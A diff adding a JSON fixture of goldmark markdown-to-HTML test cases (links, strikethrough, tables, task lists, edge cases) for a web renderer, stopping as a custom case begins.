@@ -1,0 +1,835 @@
+{
+ "note": "Generated with goldmark v1.8.6 configured as go/adapters/web/render.go (GFM plus its link renderers). Inputs: goldmark's own extension tests (MIT) and Etherchat cases.",
+ "cases": [
+  {
+   "name": "extension/_test/linkify.txt 1",
+   "md": "www.commonmark.org\n",
+   "html": "<p><a href=\"http://www.commonmark.org\" rel=\"noopener noreferrer nofollow\">www.commonmark.org</a></p>\n"
+  },
+  {
+   "name": "extension/_test/linkify.txt 2",
+   "md": "Visit www.commonmark.org/help for more information.\n",
+   "html": "<p>Visit <a href=\"http://www.commonmark.org/help\" rel=\"noopener noreferrer nofollow\">www.commonmark.org/help</a> for more information.</p>\n"
+  },
+  {
+   "name": "extension/_test/linkify.txt 3",
+   "md": "www.google.com/search?q=Markup+(business)\n\nwww.google.com/search?q=Markup+(business)))\n\n(www.google.com/search?q=Markup+(business))\n\n(www.google.com/search?q=Markup+(business)\n",
+   "html": "<p><a href=\"http://www.google.com/search?q=Markup+(business)\" rel=\"noopener noreferrer nofollow\">www.google.com/search?q=Markup+(business)</a></p>\n<p><a href=\"http://www.google.com/search?q=Markup+(business)\" rel=\"noopener noreferrer nofollow\">www.google.com/search?q=Markup+(business)</a>))</p>\n<p>(<a href=\"http://www.google.com/search?q=Markup+(business)\" rel=\"noopener noreferrer nofollow\">www.google.com/search?q=Markup+(business)</a>)</p>\n<p>(<a href=\"http://www.google.com/search?q=Markup+(business)\" rel=\"noopener noreferrer nofollow\">www.google.com/search?q=Markup+(business)</a></p>\n"
+  },
+  {
+   "name": "extension/_test/linkify.txt 4",
+   "md": "www.google.com/search?q=(business))+ok\n",
+   "html": "<p><a href=\"http://www.google.com/search?q=(business))+ok\" rel=\"noopener noreferrer nofollow\">www.google.com/search?q=(business))+ok</a></p>\n"
+  },
+  {
+   "name": "extension/_test/linkify.txt 5",
+   "md": "www.google.com/search?q=commonmark&hl=en\n\nwww.google.com/search?q=commonmark&hl;\n",
+   "html": "<p><a href=\"http://www.google.com/search?q=commonmark&amp;hl=en\" rel=\"noopener noreferrer nofollow\">www.google.com/search?q=commonmark&amp;hl=en</a></p>\n<p><a href=\"http://www.google.com/search?q=commonmark\" rel=\"noopener noreferrer nofollow\">www.google.com/search?q=commonmark</a>&amp;hl;</p>\n"
+  },
+  {
+   "name": "extension/_test/linkify.txt 6",
+   "md": "www.commonmark.org/he<lp\n",
+   "html": "<p><a href=\"http://www.commonmark.org/he\" rel=\"noopener noreferrer nofollow\">www.commonmark.org/he</a>&lt;lp</p>\n"
+  },
+  {
+   "name": "extension/_test/linkify.txt 7",
+   "md": "http://commonmark.org\n\n(Visit https://encrypted.google.com/search?q=Markup+(business))\n\nAnonymous FTP is available at ftp://foo.bar.baz.\n",
+   "html": "<p><a href=\"http://commonmark.org\" rel=\"noopener noreferrer nofollow\">http://commonmark.org</a></p>\n<p>(Visit <a href=\"https://encrypted.google.com/search?q=Markup+(business)\" rel=\"noopener noreferrer nofollow\">https://encrypted.google.com/search?q=Markup+(business)</a>)</p>\n<p>Anonymous FTP is available at <a href=\"ftp://foo.bar.baz\" rel=\"noopener noreferrer nofollow\">ftp://foo.bar.baz</a>.</p>\n"
+  },
+  {
+   "name": "extension/_test/linkify.txt 8",
+   "md": "foo@bar.baz\n",
+   "html": "<p><a href=\"mailto:foo@bar.baz\" rel=\"noopener noreferrer nofollow\">foo@bar.baz</a></p>\n"
+  },
+  {
+   "name": "extension/_test/linkify.txt 9",
+   "md": "hello@mail+xyz.example isn't valid, but hello+xyz@mail.example is.\n",
+   "html": "<p>hello@mail+xyz.example isn't valid, but <a href=\"mailto:hello+xyz@mail.example\" rel=\"noopener noreferrer nofollow\">hello+xyz@mail.example</a> is.</p>\n"
+  },
+  {
+   "name": "extension/_test/linkify.txt 10",
+   "md": "a.b-c_d@a.b\n\na.b-c_d@a.b.\n\na.b-c_d@a.b-\n\na.b-c_d@a.b_\n",
+   "html": "<p><a href=\"mailto:a.b-c_d@a.b\" rel=\"noopener noreferrer nofollow\">a.b-c_d@a.b</a></p>\n<p><a href=\"mailto:a.b-c_d@a.b\" rel=\"noopener noreferrer nofollow\">a.b-c_d@a.b</a>.</p>\n<p>a.b-c_d@a.b-</p>\n<p>a.b-c_d@a.b_</p>\n"
+  },
+  {
+   "name": "extension/_test/linkify.txt 11",
+   "md": "https://github.com#sun,mon\n",
+   "html": "<p><a href=\"https://github.com#sun,mon\" rel=\"noopener noreferrer nofollow\">https://github.com#sun,mon</a></p>\n"
+  },
+  {
+   "name": "extension/_test/linkify.txt 12",
+   "md": "https://github.com/sunday's\n",
+   "html": "<p><a href=\"https://github.com/sunday's\" rel=\"noopener noreferrer nofollow\">https://github.com/sunday's</a></p>\n"
+  },
+  {
+   "name": "extension/_test/linkify.txt 13",
+   "md": "https://github.com?q=stars:>1\n",
+   "html": "<p><a href=\"https://github.com?q=stars:%3E1\" rel=\"noopener noreferrer nofollow\">https://github.com?q=stars:&gt;1</a></p>\n"
+  },
+  {
+   "name": "extension/_test/linkify.txt 14",
+   "md": "[https://google.com](https://google.com)\n",
+   "html": "<p><a href=\"https://google.com\" rel=\"noopener noreferrer nofollow\">https://google.com</a> <span class=\"url\">(https://google.com)</span></p>\n"
+  },
+  {
+   "name": "extension/_test/linkify.txt 15",
+   "md": "This is a `git@github.com:vim/vim`\n",
+   "html": "<p>This is a <code>git@github.com:vim/vim</code></p>\n"
+  },
+  {
+   "name": "extension/_test/linkify.txt 16",
+   "md": "https://nic.college\n",
+   "html": "<p><a href=\"https://nic.college\" rel=\"noopener noreferrer nofollow\">https://nic.college</a></p>\n"
+  },
+  {
+   "name": "extension/_test/linkify.txt 17",
+   "md": "http://server.intranet.acme.com:1313\n",
+   "html": "<p><a href=\"http://server.intranet.acme.com:1313\" rel=\"noopener noreferrer nofollow\">http://server.intranet.acme.com:1313</a></p>\n"
+  },
+  {
+   "name": "extension/_test/linkify.txt 18",
+   "md": "https://g.page/foo\n",
+   "html": "<p><a href=\"https://g.page/foo\" rel=\"noopener noreferrer nofollow\">https://g.page/foo</a></p>\n"
+  },
+  {
+   "name": "extension/_test/linkify.txt 19: Trailing punctuation (specifically, ?, !, ., ,, :, *, _, and ~) will not be considered part of the autolink",
+   "md": "__http://test.com/~/a__\n__http://test.com/~/__\n__http://test.com/~__\n__http://test.com/a/~__\n",
+   "html": "<p><strong><a href=\"http://test.com/~/a\" rel=\"noopener noreferrer nofollow\">http://test.com/~/a</a></strong>\n<strong><a href=\"http://test.com/~/\" rel=\"noopener noreferrer nofollow\">http://test.com/~/</a></strong>\n<strong><a href=\"http://test.com/\" rel=\"noopener noreferrer nofollow\">http://test.com/</a>~</strong>\n<strong><a href=\"http://test.com/a/\" rel=\"noopener noreferrer nofollow\">http://test.com/a/</a>~</strong></p>\n"
+  },
+  {
+   "name": "extension/_test/strikethrough.txt 1",
+   "md": "~~Hi~~ Hello, world!\n",
+   "html": "<p><del>Hi</del> Hello, world!</p>\n"
+  },
+  {
+   "name": "extension/_test/strikethrough.txt 2",
+   "md": "This ~~has a\n\nnew paragraph~~.\n",
+   "html": "<p>This ~~has a</p>\n<p>new paragraph~~.</p>\n"
+  },
+  {
+   "name": "extension/_test/strikethrough.txt 3",
+   "md": "~Hi~ Hello, world!\n",
+   "html": "<p><del>Hi</del> Hello, world!</p>\n"
+  },
+  {
+   "name": "extension/_test/strikethrough.txt 4: Three or more tildes do not create a strikethrough",
+   "md": "This will ~~~not~~~ strike.\n",
+   "html": "<p>This will ~~~not~~~ strike.</p>\n"
+  },
+  {
+   "name": "extension/_test/strikethrough.txt 5: Leading three or more tildes do not create a strikethrough, create a code block",
+   "md": "~~~Hi~~~ Hello, world!\n",
+   "html": "<pre><code class=\"language-Hi~~~\"></code></pre>\n"
+  },
+  {
+   "name": "extension/_test/table.txt 1",
+   "md": "| foo | bar |\n| --- | --- |\n| baz | bim |\n",
+   "html": "<table>\n<thead>\n<tr>\n<th>foo</th>\n<th>bar</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>baz</td>\n<td>bim</td>\n</tr>\n</tbody>\n</table>\n"
+  },
+  {
+   "name": "extension/_test/table.txt 2",
+   "md": "| abc | defghi |\n:-: | -----------:\nbar | baz\n",
+   "html": "<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">abc</th>\n<th style=\"text-align:right\">defghi</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">bar</td>\n<td style=\"text-align:right\">baz</td>\n</tr>\n</tbody>\n</table>\n"
+  },
+  {
+   "name": "extension/_test/table.txt 3",
+   "md": "| f\\|oo  |\n| ------ |\n| b `\\|` az |\n| b **\\|** im |\n",
+   "html": "<table>\n<thead>\n<tr>\n<th>f|oo</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>b <code>|</code> az</td>\n</tr>\n<tr>\n<td>b <strong>|</strong> im</td>\n</tr>\n</tbody>\n</table>\n"
+  },
+  {
+   "name": "extension/_test/table.txt 4",
+   "md": "| abc | def |\n| --- | --- |\n| bar | baz |\n> bar\n",
+   "html": "<table>\n<thead>\n<tr>\n<th>abc</th>\n<th>def</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>bar</td>\n<td>baz</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>bar</p>\n</blockquote>\n"
+  },
+  {
+   "name": "extension/_test/table.txt 5",
+   "md": "| abc | def |\n| --- | --- |\n| bar | baz |\nbar\n\nbar\n",
+   "html": "<table>\n<thead>\n<tr>\n<th>abc</th>\n<th>def</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>bar</td>\n<td>baz</td>\n</tr>\n<tr>\n<td>bar</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<p>bar</p>\n"
+  },
+  {
+   "name": "extension/_test/table.txt 6",
+   "md": "| abc | def |\n| --- |\n| bar |\n",
+   "html": "<p>| abc | def |\n| --- |\n| bar |</p>\n"
+  },
+  {
+   "name": "extension/_test/table.txt 7",
+   "md": "| abc | def |\n| --- | --- |\n| bar |\n| bar | baz | boo |\n",
+   "html": "<table>\n<thead>\n<tr>\n<th>abc</th>\n<th>def</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>bar</td>\n<td></td>\n</tr>\n<tr>\n<td>bar</td>\n<td>baz</td>\n</tr>\n</tbody>\n</table>\n"
+  },
+  {
+   "name": "extension/_test/table.txt 8",
+   "md": "| abc | def |\n| --- | --- |\n",
+   "html": "<table>\n<thead>\n<tr>\n<th>abc</th>\n<th>def</th>\n</tr>\n</thead>\n</table>\n"
+  },
+  {
+   "name": "extension/_test/table.txt 9",
+   "md": "Foo|Bar\n---|---\n`Yoyo`|Dyne\n",
+   "html": "<table>\n<thead>\n<tr>\n<th>Foo</th>\n<th>Bar</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>Yoyo</code></td>\n<td>Dyne</td>\n</tr>\n</tbody>\n</table>\n"
+  },
+  {
+   "name": "extension/_test/table.txt 10",
+   "md": "foo|bar\n---|---\n`\\` | second column\n",
+   "html": "<table>\n<thead>\n<tr>\n<th>foo</th>\n<th>bar</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>\\</code></td>\n<td>second column</td>\n</tr>\n</tbody>\n</table>\n"
+  },
+  {
+   "name": "extension/_test/table.txt 11: Tables can interrupt paragraph",
+   "md": "**xxx**\n| hello |   hi  |\n| :----: | :----:|\n",
+   "html": "<p><strong>xxx</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">hello</th>\n<th style=\"text-align:center\">hi</th>\n</tr>\n</thead>\n</table>\n"
+  },
+  {
+   "name": "extension/_test/table.txt 12: A delimiter can not start with more than 3 spaces",
+   "md": "Foo\n    ---\n",
+   "html": "<p>Foo\n---</p>\n"
+  },
+  {
+   "name": "extension/_test/table.txt 13: A delimiter can not start with more than 3 spaces(w/ tabs)",
+   "md": "- aaa\n\n  Foo\n\\t\\t---\n",
+   "html": "<ul>\n<li>\n<p>aaa</p>\n<p>Foo\n\\t\\t---</p>\n</li>\n</ul>\n"
+  },
+  {
+   "name": "extension/_test/tasklist.txt 1",
+   "md": "- [ ] foo\n- [x] bar\n",
+   "html": "<ul>\n<li><input disabled=\"\" type=\"checkbox\"> foo</li>\n<li><input checked=\"\" disabled=\"\" type=\"checkbox\"> bar</li>\n</ul>\n"
+  },
+  {
+   "name": "extension/_test/tasklist.txt 2",
+   "md": "- [x] foo\n  - [ ] bar\n  - [x] baz\n- [ ] bim\n",
+   "html": "<ul>\n<li><input checked=\"\" disabled=\"\" type=\"checkbox\"> foo\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> bar</li>\n<li><input checked=\"\" disabled=\"\" type=\"checkbox\"> baz</li>\n</ul>\n</li>\n<li><input disabled=\"\" type=\"checkbox\"> bim</li>\n</ul>\n"
+  },
+  {
+   "name": "extension/_test/tasklist.txt 3",
+   "md": "- test[x]=[x]\n",
+   "html": "<ul>\n<li>test[x]=[x]</li>\n</ul>\n"
+  },
+  {
+   "name": "extension/_test/tasklist.txt 4",
+   "md": "+ [x] [x]\n",
+   "html": "<ul>\n<li><input checked=\"\" disabled=\"\" type=\"checkbox\"> [x]</li>\n</ul>\n"
+  },
+  {
+   "name": "_test/extra.txt 1",
+   "md": "*\tA\n    B\n",
+   "html": "<ul>\n<li>A\nB</li>\n</ul>\n"
+  },
+  {
+   "name": "_test/extra.txt 2",
+   "md": "**test**\\\ntest**test**\\\n**test**test\\\ntest**test**\n",
+   "html": "<p><strong>test</strong><br>\ntest<strong>test</strong><br>\n<strong>test</strong>test<br>\ntest<strong>test</strong></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 3",
+   "md": ">*\t>\n> \t1\n>\t\t2\n>3\n",
+   "html": "<blockquote>\n<ul>\n<li>\n<blockquote>\n</blockquote>\n</li>\n</ul>\n<p>1\n2\n3</p>\n</blockquote>\n"
+  },
+  {
+   "name": "_test/extra.txt 4",
+   "md": "`test`a`test`\n",
+   "html": "<p><code>test</code>a<code>test</code></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 5",
+   "md": "_**TL/DR** - [Go see summary.](#my-summary-area)_\n",
+   "html": "<p><em><strong>TL/DR</strong> - <a href=\"#my-summary-area\">Go see summary.</a></em></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 6",
+   "md": "[This link won't be rendered\ncorrectly](https://geeksocket.in/some-long-link-here \"This is the\nplace where everything breaks\")\n",
+   "html": "<p><a href=\"https://geeksocket.in/some-long-link-here\" rel=\"noopener noreferrer nofollow\" title=\"This is the\nplace where everything breaks\">This link won't be rendered\ncorrectly</a> <span class=\"url\">(https://geeksocket.in/some-long-link-here)</span></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 7",
+   "md": "[](./target.md)\n",
+   "html": "<p><a href=\"./target.md\"></a></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 8",
+   "md": "[]()\n",
+   "html": "<p><a href=\"\"></a></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 9",
+   "md": "[daß] is the old german spelling of [dass]\n\n[daß]: www.das-dass.de\n",
+   "html": "<p><a href=\"www.das-dass.de\">daß</a> is the old german spelling of <a href=\"www.das-dass.de\">dass</a></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 10",
+   "md": "1. First step.\n\n   ~~~\n   aaa\n   ---\n   bbb\n   ~~~\n\n2. few other steps.\n",
+   "html": "<ol>\n<li>\n<p>First step.</p>\n<pre><code>aaa\n---\nbbb\n</code></pre>\n</li>\n<li>\n<p>few other steps.</p>\n</li>\n</ol>\n"
+  },
+  {
+   "name": "_test/extra.txt 11: delimiters between ascii punctuations should be parsed",
+   "md": "`{%`_name_`%}`\n",
+   "html": "<p><code>{%</code><em>name</em><code>%}</code></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 12: the alt attribute of img should be escaped",
+   "md": "![\"](quot.jpg)\n!['](apos.jpg)\n![<](lt.jpg)\n![>](gt.jpg)\n![&](amp.jpg) \n",
+   "html": "<p><img src=\"quot.jpg\" alt=\"&quot;\">\n<img src=\"apos.jpg\" alt=\"'\">\n<img src=\"lt.jpg\" alt=\"&lt;\">\n<img src=\"gt.jpg\" alt=\"&gt;\">\n<img src=\"amp.jpg\" alt=\"&amp;\"></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 13: fenced code block starting with tab inside list",
+   "md": "* foo\n  ```Makefile\n  foo\n  \tfoo\n  ```\n",
+   "html": "<ul>\n<li>foo\n<pre><code class=\"language-Makefile\">foo\n\tfoo\n</code></pre>\n</li>\n</ul>\n"
+  },
+  {
+   "name": "_test/extra.txt 14: fenced code block inside list, mismatched tab start",
+   "md": "* foo\n  ```Makefile\n  foo\n \tfoo\n  ```\n",
+   "html": "<ul>\n<li>foo\n<pre><code class=\"language-Makefile\">foo\n  foo\n</code></pre>\n</li>\n</ul>\n"
+  },
+  {
+   "name": "_test/extra.txt 15: fenced code block inside nested list",
+   "md": "* foo\n  -  bar\n     ```Makefile\n     foo\n     \tfoo\n     ```\n",
+   "html": "<ul>\n<li>foo\n<ul>\n<li>bar\n<pre><code class=\"language-Makefile\">foo\n\tfoo\n</code></pre>\n</li>\n</ul>\n</li>\n</ul>\n"
+  },
+  {
+   "name": "_test/extra.txt 16: indented code block starting with a tab.",
+   "md": "* foo\n   \n      foo\n      \tfoo\n\n",
+   "html": "<ul>\n<li>\n<p>foo</p>\n<pre><code>foo\n\tfoo\n</code></pre>\n</li>\n</ul>\n"
+  },
+  {
+   "name": "_test/extra.txt 17: fenced code block in list, empty line, spaces on start",
+   "md": "* foo\n  ```Makefile\n  foo\n  \n  foo\n  ```\n",
+   "html": "<ul>\n<li>foo\n<pre><code class=\"language-Makefile\">foo\n\nfoo\n</code></pre>\n</li>\n</ul>\n"
+  },
+  {
+   "name": "_test/extra.txt 18: fenced code block in list, empty line, no spaces on start",
+   "md": "* foo\n  ```Makefile\n  foo\n\n  foo\n  ```\n",
+   "html": "<ul>\n<li>foo\n<pre><code class=\"language-Makefile\">foo\n\nfoo\n</code></pre>\n</li>\n</ul>\n"
+  },
+  {
+   "name": "_test/extra.txt 19: fenced code block inside nested list, empty line, spaces on start",
+   "md": "* foo\n  -  bar\n     ```Makefile\n     foo\n\n     foo\n     ```\n",
+   "html": "<ul>\n<li>foo\n<ul>\n<li>bar\n<pre><code class=\"language-Makefile\">foo\n\nfoo\n</code></pre>\n</li>\n</ul>\n</li>\n</ul>\n"
+  },
+  {
+   "name": "_test/extra.txt 20: fenced code block inside nested list, empty line, no space on start",
+   "md": "* foo\n  -  bar\n     ```Makefile\n     foo\n\n     foo\n     ```\n",
+   "html": "<ul>\n<li>foo\n<ul>\n<li>bar\n<pre><code class=\"language-Makefile\">foo\n\nfoo\n</code></pre>\n</li>\n</ul>\n</li>\n</ul>\n"
+  },
+  {
+   "name": "_test/extra.txt 21: Fenced code block within list can start with tab",
+   "md": "- List\n\n    ```\n    A\n    \tB\n    C\n    ```\n",
+   "html": "<ul>\n<li>\n<p>List</p>\n<pre><code>A\n\tB\nC\n</code></pre>\n</li>\n</ul>\n"
+  },
+  {
+   "name": "_test/extra.txt 22: Indented code block within list can start with tab",
+   "md": "- List\n\n      A\n      \tB\n      C\n\na\n",
+   "html": "<ul>\n<li>\n<p>List</p>\n<pre><code>A\n\tB\nC\n</code></pre>\n</li>\n</ul>\n<p>a</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 23: Emphasis corner case(yuin/goldmark#245)",
+   "md": "a* b c d *e*\n",
+   "html": "<p>a* b c d <em>e</em></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 24: HTML block tags can contain trailing spaces",
+   "md": "<aaa >\n",
+   "html": "<!-- raw HTML omitted -->\n"
+  },
+  {
+   "name": "_test/extra.txt 25: Indented code blocks can start with tab",
+   "md": "\t\tx\n",
+   "html": "<pre><code>\tx\n</code></pre>\n"
+  },
+  {
+   "name": "_test/extra.txt 26: NUL bytes must be replaced with U+FFFD",
+   "md": "hello\\x00world\n\n<?\\x00\n",
+   "html": "<p>hello\\x00world</p>\n<!-- raw HTML omitted -->\n"
+  },
+  {
+   "name": "_test/extra.txt 27: Newlines in code spans must be preserved as a space",
+   "md": "`\\n`\n\n`x\\n`\n\n`\\nx`\n",
+   "html": "<p><code>\\n</code></p>\n<p><code>x\\n</code></p>\n<p><code>\\nx</code></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 28: Single # is a heading level 1",
+   "md": "#\n",
+   "html": "<h1></h1>\n"
+  },
+  {
+   "name": "_test/extra.txt 29: An empty list item cannot interrupt a paragraph",
+   "md": "x\n*\n",
+   "html": "<p>x\n*</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 30: A link reference definition followed by a single quote without closer",
+   "md": "[x]\n\n[x]: <>\n'\n",
+   "html": "<p><a href=\"\">x</a></p>\n<p>'</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 31: A link reference definition followed by a double quote without closer",
+   "md": "[x]\n\n[x]: <>\n\"\n",
+   "html": "<p><a href=\"\">x</a></p>\n<p>&quot;</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 32: Hex character entities must be limited to 6 characters",
+   "md": "&#x0000041;\n",
+   "html": "<p>&amp;#x0000041;</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 33: \\x01 should be escaped all the time",
+   "md": "[x](\\x01)\n",
+   "html": "<p><a href=\"%5Cx01\">x</a></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 34: A form feed should not be treated as a space",
+   "md": "x \\f\n",
+   "html": "<p>x \\f</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 35: A link reference definition can contain a new line",
+   "md": "This is a [test][foo\nbar] 1...2..3...\n\n[foo bar]: /\n",
+   "html": "<p>This is a <a href=\"/\">test</a> 1...2..3...</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 36: Emphasis and links",
+   "md": "_a[b_c_](d)\n",
+   "html": "<p>_a<a href=\"d\">b_c_</a></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 37: Tabs and spaces",
+   "md": "\\t\\t x\\n\n",
+   "html": "<p>\\t\\t x\\n</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 38: Decimal HTML entity literals should allow 7 digits",
+   "md": "&#7654321;\n",
+   "html": "<p>�</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 39: Decimal HTML entities should not be interpreted as octal when starting with a 0",
+   "md": "&#0100;\n",
+   "html": "<p>d</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 40: Invalid HTML tag names",
+   "md": "<1>\n\n<a:>\n\n<a\\f>\n\n< p>\n",
+   "html": "<p>&lt;1&gt;</p>\n<p>&lt;a:&gt;</p>\n<p>&lt;a\\f&gt;</p>\n<p>&lt; p&gt;</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 41: Link references can not contain spaces after link label",
+   "md": "[x]\n:>\n\n[o] :x\n",
+   "html": "<p>[x]\n:&gt;</p>\n<p>[o] :x</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 42: Unclosed link reference titles can interrupt link references",
+   "md": "[r]:\n<>\n'\n\n[o]:\nx\n'\n",
+   "html": "<p>'</p>\n<p>'</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 44: An empty list item(with trailing spaces) cannot interrupt a paragraph",
+   "md": "a\n*  \n",
+   "html": "<p>a\n*</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 45: Multiple empty list items",
+   "md": "-\n\n-\n",
+   "html": "<ul>\n<li></li>\n<li></li>\n</ul>\n"
+  },
+  {
+   "name": "_test/extra.txt 46: Vertical tab should not be treated as spaces",
+   "md": "\\v\n",
+   "html": "<p>\\v</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 47: Escape back slashes should not be treated as hard line breaks",
+   "md": "\\\\\\\\\na\n",
+   "html": "<p>\\\\\na</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 48: Multiple paragraphs in tight list",
+   "md": "- a\n  >\n  b\n",
+   "html": "<ul>\n<li>a\n<blockquote>\n</blockquote>\nb</li>\n</ul>\n"
+  },
+  {
+   "name": "_test/extra.txt 49: A list item that is indented up to 3 spaces after an empty list item",
+   "md": "1.\n\n   1. b\n\n-\n\n  - b\n",
+   "html": "<ol>\n<li></li>\n<li>\n<p>b</p>\n</li>\n</ol>\n<ul>\n<li></li>\n<li>\n<p>b</p>\n</li>\n</ul>\n"
+  },
+  {
+   "name": "_test/extra.txt 50: Spaces before a visible hard linebreak should be preserved",
+   "md": "a \\\nb\n",
+   "html": "<p>a <br>\nb</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 51: Empty line in a fenced code block under list items",
+   "md": "* This is a list item\n    ```\n    This is a test\n\n    This line will be dropped.\n    This line will be displayed.\n    ```\n",
+   "html": "<ul>\n<li>This is a list item\n<pre><code>This is a test\n\nThis line will be dropped.\nThis line will be displayed.\n</code></pre>\n</li>\n</ul>\n"
+  },
+  {
+   "name": "_test/extra.txt 52: windows-style newline and HTMLs",
+   "md": "<a \\r\\nhref='link'>link</a>\n\n<video autoplay muted loop>\\r\\n<source src=\\\"https://example.com/example.mp4\\\" type=\\\"video/mp4\\\">\\r\\nYour browser does not support the video tag.\\r\\n</video>\n",
+   "html": "<p>&lt;a \\r\\nhref='link'&gt;link<!-- raw HTML omitted --></p>\n<p><!-- raw HTML omitted -->\\r\\n&lt;source src=&quot;https://example.com/example.mp4&quot; type=&quot;video/mp4&quot;&gt;\\r\\nYour browser does not support the video tag.\\r\\n<!-- raw HTML omitted --></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 53: HTML comment without trailing new lines",
+   "md": "<!--\n-->\n",
+   "html": "<!-- raw HTML omitted -->\n<!-- raw HTML omitted -->\n"
+  },
+  {
+   "name": "_test/extra.txt 54: Escaped characters followed by a null character",
+   "md": "\\\\\\x00\\\"\n",
+   "html": "<p>\\\\x00&quot;</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 55: inline HTML comment",
+   "md": "a <!-- b --> c\n\na <!-- b -->\n",
+   "html": "<p>a <!-- raw HTML omitted --> c</p>\n<p>a <!-- raw HTML omitted --></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 56: An empty list followed by blockquote",
+   "md": "1.\n> This is a quote.\n",
+   "html": "<ol>\n<li></li>\n</ol>\n<blockquote>\n<p>This is a quote.</p>\n</blockquote>\n"
+  },
+  {
+   "name": "_test/extra.txt 57: Tabbed fenced code block within a list",
+   "md": "1.\n\t```\n\t```\n",
+   "html": "<ol>\n<li>\n<pre><code></code></pre>\n</li>\n</ol>\n"
+  },
+  {
+   "name": "_test/extra.txt 58: HTML end tag without trailing new lines",
+   "md": "<pre>\n</pre>\n",
+   "html": "<!-- raw HTML omitted -->\n<!-- raw HTML omitted -->\n"
+  },
+  {
+   "name": "_test/extra.txt 59: Raw HTML tag with one new line",
+   "md": "<img src=./.assets/logo.svg\n/>\n",
+   "html": "<p><!-- raw HTML omitted --></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 60: Raw HTML tag with multiple new lines",
+   "md": "<img src=./.assets/logo.svg\n\n/>\n",
+   "html": "<p>&lt;img src=./.assets/logo.svg</p>\n<p>/&gt;</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 61: Image alt with a new line",
+   "md": "![alt\ntext](logo.png)\n",
+   "html": "<p><img src=\"logo.png\" alt=\"alt\ntext\"></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 62: Image alt with an escaped character",
+   "md": "![\\`alt](https://example.com/img.png)\n",
+   "html": "<p><img src=\"https://example.com/img.png\" alt=\"`alt\"></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 63: Emphasis in link label",
+   "md": "[*[a]*](b)\n",
+   "html": "<p><a href=\"b\"><em>[a]</em></a></p>\n"
+  },
+  {
+   "name": "_test/extra.txt 64: Nested list under an empty list item",
+   "md": "- \n  - foo\n",
+   "html": "<ul>\n<li>\n<ul>\n<li>foo</li>\n</ul>\n</li>\n</ul>\n"
+  },
+  {
+   "name": "_test/extra.txt 65: Nested fenced code block with tab",
+   "md": ">  ```\n>\t0\n>  ```\n",
+   "html": "<blockquote>\n<pre><code> 0\n</code></pre>\n</blockquote>\n"
+  },
+  {
+   "name": "_test/extra.txt 66: EOF should be rendered as a newline with an unclosed block(w/ TAB)",
+   "md": ">  ```\n>\t0\n",
+   "html": "<blockquote>\n<pre><code> 0\n</code></pre>\n</blockquote>\n"
+  },
+  {
+   "name": "_test/extra.txt 67: EOF should be rendered as a newline with an unclosed block",
+   "md": ">  ```\n>   0\n",
+   "html": "<blockquote>\n<pre><code> 0\n</code></pre>\n</blockquote>\n"
+  },
+  {
+   "name": "_test/extra.txt 68: HTML comments in list items",
+   "md": "- test\n  <!--\n    Test\n  -->\n- test2\n",
+   "html": "<ul>\n<li>test\n<!-- raw HTML omitted -->\n<!-- raw HTML omitted -->\n</li>\n<li>test2</li>\n</ul>\n"
+  },
+  {
+   "name": "_test/extra.txt 69: Negative indentation with tabs in fenced code block",
+   "md": "*\n\\t ~~~\n\\t0\n",
+   "html": "<ul>\n<li></li>\n</ul>\n<p>\\t ~~~\n\\t0</p>\n"
+  },
+  {
+   "name": "_test/extra.txt 70: Single letter ATX heading",
+   "md": "# A\n",
+   "html": "<h1>A</h1>\n"
+  },
+  {
+   "name": "_test/extra.txt 71: Negative indentation with tabs in fenced code block",
+   "md": "*\n\\t* \\t~\n",
+   "html": "<ul>\n<li></li>\n</ul>\n<p>\\t* \\t~</p>\n"
+  },
+  {
+   "name": "custom 0",
